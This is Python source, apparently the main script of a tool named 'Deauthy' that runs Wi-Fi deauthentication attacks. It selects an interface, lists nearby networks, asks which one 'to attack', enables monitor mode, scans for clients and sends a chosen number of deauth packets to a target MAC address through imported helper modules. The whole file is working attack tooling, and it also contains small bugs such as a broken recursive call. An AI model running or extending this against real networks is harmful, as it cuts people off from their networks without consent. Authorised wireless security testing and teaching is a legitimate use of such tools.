from __menu__ import get_networks, monitor_mode, client_scanning
from time import sleep
from netifaces import interfaces
from colorama import init, Fore, Style
import os

def clear():
	os.system("clear")

init(autoreset=True)

class Deauthy:
	def __init__(self):
		self.interface = "wlan0"
		self.channel = str()
		self.bssid = str()
		self.ssid = str()

	def exit(self):
		answer = input(Fore.YELLOW + " \n [?] Do you want to continue ? [y/n]: ").lower().strip()
		if answer == "y":
			self.main()
		elif answer == "n":
			monitor_mode.desactivate(self.interface)
			exit()
		else:
			print(Fore.RED + "[!] Invalid option ")
			sleep(0.5)
			clear()
			self.exit()

	def select_interface(self):
		availables_interfaces = interfaces()
		counter = 1

		print(Fore.YELLOW + "***SELECT INTERFACE***")
		for interface in availables_interfaces:
			print(f"{counter}- {interface}")
			counter +=1

		interface = input("\n [+] Enter the interface to use (ex. 'wlan0' without quotes): ")
		if interface in availables_interfaces:
			self.interface = interface
		elif "wlan1" in availables_interfaces and interface == "":
			print("Selecting 'wlan1' by default")
			self.interface = "wlan1"
		elif "wlan0" in availables_interfaces and interface== "":
			print("Selecting 'wlan0' by default")
			self.interface = "wlan0"
		else:
			print(Fore.RED + "\n [!] Selected an invalid interface")
			sleep(1)
			clear()
			self.select_interface()


	def select_network(self):
		networks = get_networks.get_networks(self.interface)
		networks_ssid = [network.ssid for network in networks]
		ssid_counter = len(networks_ssid)
		counter = ssid_counter - 1

		print(Fore.YELLOW + " \n\n ***SELECT SSID (Network Name)***")
		for network_ssid in networks_ssid:
			print(f"{ssid_counter-counter} - {network_ssid}")
			counter -= 1

		try:
			selected_network = int(input("[+] Enter the network to attack (number): "))
			channel = networks[selected_network-1].channel
			bssid = networks[selected_network-1].address
			ssid = networks[selected_network-1].ssid
			print(Fore.YELLOW + "\n\n **Network Info*+")
			print(Fore.YELLOW + f"SSID: {ssid} | BSSID: {bssid} ")
			confirm = input("- IS this correct ? [y/n]: ").lower()
			if confirm == "y":
				return ssid, bssid, channel
			elif confirm == "n":
				clear()
				self.select_network()
			else:
				print(Fore.RED + "[!] Invalid option")
		except ValueError:
			print(Fore.RED + "[!] Invalid option")
			sleep(2)
			os.system("clear")
			select_network()

	def main(self):
		try:
			interface = self.select_interface()
			monitor_mode.desactivate(self.interface)
			self.ssid, self.bssid, self.channel = self.select_network()
			monitor_mode.activate(self.interface, self.channel)
			sleep(1)

			client_scanning.scan(self.bssid, self.channel, self.interface)
			sleep(1)

			print("\n")
			client = input("[+] Enter the target to deauth (MAC addr): ")
			quantity = input("[+] Enter packets quantity (numbers): ")
			client_scanning.deauth(client, self.bssid, quantity, self.interface)

			sleep(1)
			clear()
			self.exit()

			self.main()

		except KeyboardInterrupt:
			self.exit()

		except UnboundLocalError:
			exit()


if __name__ == "__main__":
	Deauthy = Deauthy()
	Deauthy.main()
